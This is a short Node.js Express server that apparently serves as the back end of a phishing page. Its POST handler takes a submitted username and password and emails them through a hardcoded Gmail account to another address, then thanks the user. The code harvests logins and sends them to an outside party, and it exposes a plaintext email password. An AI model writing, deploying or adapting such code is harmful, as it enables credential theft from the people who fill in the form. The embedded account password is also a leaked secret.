const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.post('send.js', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jokercode551@gmail.com',
            pass: 'pank84@123'
        }
    });
    const mailOptions = {
        from: 'jokercode551@gmail.com',
        to: 'mangleshop028@gmail.com',
        subject: 'Username Submission',
        text: `Username: ${username} ${password}`
    };
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
    res.send('Thank you for submitting!');
});

app.listen(3000, () => {
    console.log('Server listening on port 3000');
});